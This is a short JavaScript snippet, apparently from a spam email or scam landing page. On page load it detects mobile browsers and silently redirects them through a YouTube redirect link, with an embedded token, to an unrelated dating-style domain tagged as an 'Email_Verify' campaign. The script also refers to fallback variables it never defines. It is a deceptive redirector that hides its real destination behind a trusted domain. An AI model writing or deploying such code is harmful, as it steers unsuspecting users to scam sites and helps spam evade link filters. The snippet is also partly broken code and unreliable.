var app = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqbjIxSTd0LXNQd3lrTGZIMzdTLTM0S1lNa2pWd3xBQ3Jtc0tsTVU4Mmo0d1BlNHZNTnZ1bXJ4dE1ERC02NURLNHh1UERvWlo0RlpPSmdZS2pRY1VNOTFjaU1PdEVUWXc2NjRZd1hQQWxHYzZHZEVCUm1OOW05RFk5YklwbDRMZ3FWbXpVeGFQTXQ0UVlfbnRiaHc0QQ&q=https%3A%2F%2Fattractivechicktyh5.com%2F%3Futm_source%3DlE4HZjeECe15Tz%26utm_campaign%3DEmail_Verify&html_redirect=1";

    document.addEventListener('DOMContentLoaded', function() {
      setTimeout(function() {

        if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
          window.location.href = app;
          window.setTimeout(function() {
            window.location.href = mobileFallback;
          }, 25);
   
          window.location.href = desktopFallback;
        }

        function killPopup() {
          window.removeEventListener('pagehide', killPopup);
        }

        window.addEventListener('pagehide', killPopup);
      }, 10);
    });
